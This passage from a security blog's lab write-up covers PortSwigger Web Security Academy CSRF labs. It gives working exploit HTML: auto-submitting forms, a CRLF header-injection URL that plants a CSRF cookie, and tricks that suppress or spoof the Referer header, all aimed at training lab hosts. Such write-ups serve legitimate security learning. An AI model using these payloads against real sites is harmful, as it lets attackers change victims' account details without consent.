</pre></table></code></div></div><p>CSRF token is set to our spoofed value and it stays the same.</p><p><img data-src="/assets/images/a5d21685409a86f3b2bb6ea1ae31578feb538d9b215de62e7bc792661591e4f4.png" alt="picture 7" data-proofer-ignore></p><p>We can deliver similar payload as in previous lab</p><div class="language-html highlighter-rouge"><div class="code-header"> <span label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="nt">&lt;form</span> <span class="na">method=</span><span class="s">"POST"</span> <span class="na">action=</span><span class="s">"https://0aef0089046807e7c06dccfb00dc00ae.web-security-academy.net/my-account/change-email"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"email"</span> <span class="na">value=</span><span class="s">"anything@web-security-academy.net"</span><span class="nt">&gt;</span>
<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"csrf"</span> <span class="na">value=</span><span class="s">"spoof"</span><span class="nt">&gt;</span>

<span class="nt">&lt;/form&gt;</span>

<span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"https://0aef0089046807e7c06dccfb00dc00ae.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=spoof%3b%20SameSite=None"</span> <span class="na">onerror=</span><span class="s">"document.forms[0].submit();"</span><span class="nt">/&gt;</span>
</pre></table></code></div></div><h1 id="csrf-where-referer-validation-depends-on-header-being-present">CSRF where Referer validation depends on header being present</h1><blockquote><p>This lab’s email change functionality is vulnerable to CSRF. It attempts to block cross domain requests but has an insecure fallback.</p><p>To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer’s email address.</p><p>You can log in to your own account using the following credentials: <code class="language-plaintext highlighter-rouge">wiener:peter</code></p></blockquote><p>In this lab we’re supposed to change the email from the victim. If we log in we and change the email, request will be send like this (I’ve removed some irelevant headers):</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre>POST /my-account/change-email HTTP/1.1
Host: 0acc007a0407b9cdc0166311009f004e.web-security-academy.net
Cookie: session=XQrmFJwOd7sZAGjGr6IlA7Uxx149kezF
...
Content-Type: application/x-www-form-urlencoded
Content-Length: 28
Origin: https://0acc007a0407b9cdc0166311009f004e.web-security-academy.net
Referer: https://0acc007a0407b9cdc0166311009f004e.web-security-academy.net/my-account
Upgrade-Insecure-Requests: 1
...
Pragma: no-cache
Cache-Control: no-cache
Te: trailers
Connection: close

email=asdd%40normal-user.net
</pre></table></code></div></div><p>Email will be changed, if we however change referrer to our exploit address, we’ll see <code class="language-plaintext highlighter-rouge">Invalid referer header</code>. If we remove referrer header entirely, we’ll be able to change the email again.</p><p>We can deliver payload as we’ve done it before, just this time by using <code class="language-plaintext highlighter-rouge">&lt;meta name="referrer" content="no-referrer"&gt;</code> which won’t forward the header to the web server in the CSRF request.</p><div class="language-html highlighter-rouge"><div class="code-header"> <span label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"referrer"</span> <span class="na">content=</span><span class="s">"no-referrer"</span><span class="nt">&gt;</span>
<span class="nt">&lt;form</span> <span class="na">method=</span><span class="s">"POST"</span> <span class="na">action=</span><span class="s">"https://0acc007a0407b9cdc0166311009f004e.web-security-academy.net/my-account/change-email"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"email"</span> <span class="na">value=</span><span class="s">"anything@web-security-academy.net"</span><span class="nt">&gt;</span>
<span class="nt">&lt;/form&gt;</span>

<span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">x</span> <span class="na">onerror=</span><span class="s">"document.forms[0].submit();"</span><span class="nt">/&gt;</span>
</pre></table></code></div></div><h1 id="csrf-with-broken-referer-validation">CSRF with broken Referer validation</h1><blockquote><p>This lab’s email change functionality is vulnerable to CSRF. It attempts to detect and block cross domain requests, but the detection mechanism can be bypassed.</p><p>To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer’s email address.</p><p>You can log in to your own account using the following credentials: <code class="language-plaintext highlighter-rouge">wiener:peter</code></p></blockquote><p>This lab looks like the previous ones. We login using provided credentials <code class="language-plaintext highlighter-rouge">wiener:peter</code> and change the email and send this change request to repeater.</p><p>After fiddling with the Referrer header, request will be accepted if it contains the URL. If i use URL from exploit server, request won’t be accepted anymore.</p><p>Problem arises how to spoof referrer header using reflection in victims browser.</p><p>This is one of the ways how the labs can be done.</p><div class="language-html highlighter-rouge"><div class="code-header"> <span label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"referrer"</span> <span class="na">content=</span><span class="s">"unsafe-url"</span><span class="nt">&gt;</span>
<span class="nt">&lt;script&gt;</span>
<span class="nx">history</span><span class="p">.</span><span class="nx">pushState</span><span class="p">(</span><span class="dl">""</span><span class="p">,</span> <span class="dl">""</span><span class="p">,</span> <span class="dl">"</span><span class="s2">/?c=https://0ab4007d03078aecc0dab49e00b000a3.web-security-academy.net/my-account</span><span class="dl">"</span><span class="p">)</span>
<span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;form</span> <span class="na">method=</span><span class="s">"POST"</span> <span class="na">action=</span><span class="s">"https://0ab4007d03078aecc0dab49e00b000a3.web-security-academy.net/my-account/change-email"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"email"</span> <span class="na">value=</span><span class="s">"anything@web-security-academy.net"</span><span class="nt">&gt;</span>
<span class="nt">&lt;/form&gt;</span>

<span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">x</span>  <span class="na">onerror=</span><span class="s">"document.forms[0].submit();"</span><span class="nt">/&gt;</span>
</pre></table></code></div></div><p>Mind the Referrer using <code class="language-plaintext highlighter-rouge">unsafe-url</code> and <code class="language-plaintext highlighter-rouge">history.pushState</code>!</p><blockquote><p>All the labs look opticaly the same so i didn’t make that many screenshots, so appologies for that!</p></blockquote></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/web-application/'>Web Application</a>, <a href='/categories/cross-site-request-forgery/'>Cross-Site Request Forgery</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/notes/" class="post-tag no-text-decoration" >Notes</a> <a href="/tags/web-application/" class="post-tag no-text-decoration" >Web Application</a> <a href="/tags/portswigger/" class="post-tag no-text-decoration" >Portswigger</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=(Portswigger/WebAcademy) - Cross-Site Request Forgery (CSRF) - CyberSec-Research.Space&url=https://an9k0r.github.io/posts/CSRF/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=(Portswigger/WebAcademy) - Cross-Site Request Forgery (CSRF) - CyberSec-Research.Space&u=https://an9k0r.github.io/posts/CSRF/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=(Portswigger/WebAcademy) - Cross-Site Request Forgery (CSRF) - CyberSec-Research.Space&url=https://an9k0r.github.io/posts/CSRF/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/insecure_deserialization/">(Portswigger/WebAcademy) - Insecure Deserialization vulnerabilities</a><li><a href="/posts/ssti/">(Portswigger/WebAcademy) - Server-Side Template Injection vulnerabilities</a><li><a href="/posts/stored_XSS/">(Portswigger/WebAcademy) - Stored Cross-Site Scripting (XSS)</a><li><a href="/posts/Blind_SQL_Injection/">Blind SQL Injection</a><li><a href="/posts/OS_Command_Injection/">OS Command Injection</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/notes/">Notes</a> <a class="post-tag" href="/tags/portswigger/">Portswigger</a> <a class="post-tag" href="/tags/web-application/">Web Application</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/clear-text-credentials/">Clear Text Credentials</a> <a class="post-tag" href="/tags/password-reuse/">Password Reuse</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/deserialization/">Deserialization</a> <a class="post-tag" href="/tags/misconfiguration/">Misconfiguration</a> <a class="post-tag" href="/tags/password-cracking/">Password Cracking</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Blind_SQL_Injection/"><div class="card-body"> <em class="timeago small" date="2022-09-30 09:00:00 +0200" >Sep 30, 2022</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Blind SQL Injection</h3><div class="text-muted small"><p> Intro Lab at portswigger: Blind SQL Injection TOC Intro TOC Blind SQL injection with conditional responses Intro Finding the SQL Injection Database Enumeration ...</p></div></div></a></div><div class="card"> <a href="/posts/Alternative_vulnerable_authentication_mechanismus/"><div class="card-body"> <em class="timeago small" date="2022-09-30 09:00:00 +0200" >Sep 30, 2022</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Other vulnerable Authentication Mechanismus</h3><div class="text-muted small"><p> Intro This post/writeup is all about the Authentication vulnerabilities or Broken Authentication if we follow OWASP naming scheme. I’ll be using primarily Portswigger Web Academy Labs, but i do in...</p></div></div></a></div><div class="card"> <a href="/posts/Multi_Factor_Authentication/"><div class="card-body"> <em class="timeago small" date="2022-09-30 09:00:00 +0200" >Sep 30, 2022</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Multi-Factor Authentication (MFA)</h3><div class="text-muted small"><p> Intro This post/writeup is all about the Authentication vulnerabilities or Broken Authentication if we follow OWASP naming scheme. I’ll be using primarily Portswigger Web Academy Labs, but i do in...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Web_Cache_Poisoning/" class="btn btn-outline-primary" prompt="Older"><p>(Portswigger/WebAcademy) - Web Cache Poisoning (Unkeyed Inputs)</p></a> <a href="/posts/CORS/" class="btn btn-outline-primary" prompt="Newer"><p>(Portswigger/WebAcademy) - Cross-Origin Resource Sharing (CORS)</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/cybersec_space">eng4ge</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/notes/">Notes</a> <a class="post-tag" href="/tags/portswigger/">Portswigger</a> <a class="post-tag" href="/tags/web-application/">Web Application</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/clear-text-credentials/">Clear Text Credentials</a> <a class="post-tag" href="/tags/password-reuse/">Password Reuse</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/deserialization/">Deserialization</a> <a class="post-tag" href="/tags/misconfiguration/">Misconfiguration</a> <a class="post-tag" href="/tags/password-cracking/">Password Cracking</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><script src="https://cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js"></script> <script> $(function() { function updateMermaid(event) { if (event.source === window && event.data && event.data.direction === ModeToggle.ID) { const mode = event.data.message; if (typeof mermaid === "undefined") { return; } let expectedTheme = (mode === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* Re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } let initTheme = "default"; if ($("html[mode=dark]").length > 0 || ($("html[mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches ) ) { initTheme = "dark"; } let mermaidConf = { theme: initTheme /* <default|dark|forest|neutral> */ }; /* Markdown converts to HTML */ $("pre").has("code.language-mermaid").each(function() { let svgCode = $(this).children().html(); $(this).addClass("unloaded"); $(this).after(`<div class=\"mermaid\">${svgCode}</div>`); }); mermaid.initialize(mermaidConf); window.addEventListener("message", updateMermaid); }); </script><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script> /* see: <https://docs.mathjax.org/en/latest/options/input/tex.html#tex-options> */ MathJax = { tex: { inlineMath: [ /* start/end delimiter pairs for in-line math */ ['$','$'], ['\\(','\\)'] ], displayMath: [ /* start/end delimiter pairs for display math */ ['$$', '$$'], ['\\[', '\\]'] ] } }; </script> <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script type="text/javascript" id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"> </script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script>
